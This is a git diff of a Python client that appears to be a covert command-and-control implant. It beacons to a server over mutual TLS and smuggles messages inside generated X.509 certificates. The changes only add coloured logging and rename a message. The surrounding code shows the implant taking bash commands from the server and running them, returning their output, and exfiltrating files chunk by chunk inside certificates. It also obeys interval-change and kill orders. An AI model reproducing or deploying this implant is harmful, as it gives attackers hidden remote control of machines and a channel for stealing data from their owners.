@@ -5,7 +5,7 @@ import socket
 import ssl
 import random
 from cryptography import x509
-from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen
+from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen, Colors
 
 
 def run_bash_cmd(cmd):
@@ -36,7 +36,7 @@ def chunk_file(exfil_file, max_block_size, jitter):
             image_data = handle.read(size)
             if not image_data:
                 break
-            print(f"reading {len(image_data)} bytes from file")
+            print(f"{Colors.LIGHT_CYAN}Reading {len(image_data)} bytes from file{Colors.ENDC}")
             position += size
             if transfer_state == 2 and len(image_data) != size:
                 transfer_state = 3
@@ -46,6 +46,7 @@ def chunk_file(exfil_file, max_block_size, jitter):
 
 
 def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert):
+    print(f"{Colors.LIGHT_CYAN}Creating client side socket{Colors.ENDC}")
     msg_cert, msg_key = msg_cert
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.setblocking(1)
@@ -57,7 +58,7 @@ def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cer
             tear down the socket, and spin up a new socket with the new cert. If the client tries to call 
             while the socket is down, just sleep a bit and try again
             """
-            print(f"Server connection refused - trying again soon")
+            print(f"{Colors.RED}Server connection refused - trying again soon{Colors.ENDC}")
             return None
         context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
         context.verify_mode = ssl.CERT_REQUIRED
@@ -68,6 +69,7 @@ def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cer
             cert = x509.load_der_x509_certificate(cert)
             # secure_sock.write(b'hello')
             # print(secure_sock.read(1024))
+    print(f"{Colors.LIGHT_CYAN}Tearing down client side socket{Colors.ENDC}")
     return cert
 
 
@@ -88,7 +90,7 @@ def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_ke
         msg_cert_path, msg_key_path = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data_chunck)
         # send data to server
         call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, (msg_cert_path, msg_key_path))
-    print("file exfill complete")
+    print(f"{Colors.LIGHT_CYAN}File exfill complete{Colors.ENDC}")
 
 
 def pos_or_neg():
@@ -103,12 +105,12 @@ def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path
     ca_key, ca_cert = init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)
 
     # pre-create the request command
-    request_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="request")
+    request_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="beacon")
     next_msg_cert = request_msg_cert
     while True:
         # calc beacon delay
         beacon_delay = int(beacon_interval + (pos_or_neg() * (beacon_interval * (random.randrange(0, beacon_jitter) / 100))))
-        print(f"sleeping for {beacon_delay} seconds")
+        print(f"{Colors.LIGHT_CYAN}Sleeping for {beacon_delay} seconds{Colors.ENDC}")
         time.sleep(beacon_delay)
         # call server for cmd
         cert = call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, next_msg_cert)
@@ -116,10 +118,9 @@ def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path
             srv_msg, srv_data = get_cert_msg(cert)
             if srv_msg == "bash":
                 command = srv_data.strip()
-                print(f"executing cmd: {command}")
+                print(f"{Colors.LIGHT_CYAN}Executing cmd: {command}{Colors.ENDC}")
                 data = run_bash_cmd(command.split(" "))
-                msg = f"response"
-                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data)
+                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response", data=data)
             elif srv_msg == "noop":
                 # nothing to do
                 print("noop")
@@ -129,7 +130,7 @@ def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path
                 beacon_interval, beacon_jitter = srv_data.strip().split(",")
                 beacon_interval = int(beacon_interval)
                 beacon_jitter = int(beacon_jitter)
-                print(f"updating beacon interval to {beacon_interval} with jitter of {beacon_jitter}")
+                print(f"{Colors.LIGHT_CYAN}Updating beacon interval to {beacon_interval} with jitter of {beacon_jitter}{Colors.ENDC}")
                 next_msg_cert = request_msg_cert
             elif srv_msg == "exfil":
                 exfil_file = srv_data.strip()
@@ -139,10 +140,10 @@ def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path
                 # set next msg to request
                 next_msg_cert = request_msg_cert
             elif srv_msg == "kill":
-                print("SHUTTING DOWN")
+                print(f"{Colors.RED}SHUTTING DOWN{Colors.ENDC}")
                 return
             else:
-                print(f"WARN: invalid msg: {srv_msg}")
+                print(f"{Colors.RED}WARN: invalid msg: {srv_msg}{Colors.ENDC}")
 
 
 def main():
